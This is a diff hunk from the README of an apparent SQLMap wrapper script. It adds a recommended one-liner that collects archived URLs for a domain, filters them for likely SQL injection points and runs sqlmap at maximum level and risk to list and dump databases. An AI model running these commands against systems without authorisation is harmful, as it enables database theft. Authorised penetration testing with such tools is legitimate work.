@@ -50,6 +50,7 @@ This command will iterate through each URL in the urls.txt file and run SQLMap o
 
 # Reccomended Command
 ./sqlmap.sh -f urls.txt --dbs --batch --level=5 --risk=3 --dump --hostname
+waybackurls domain.com | gf sqli | ./sqlmap.sh --dbs --batch --level=5 --risk=3 --dump --hostname
 
 # Notes
 Make sure that webhook.sh has execution permissions. You can set this with chmod +x webhook.sh.
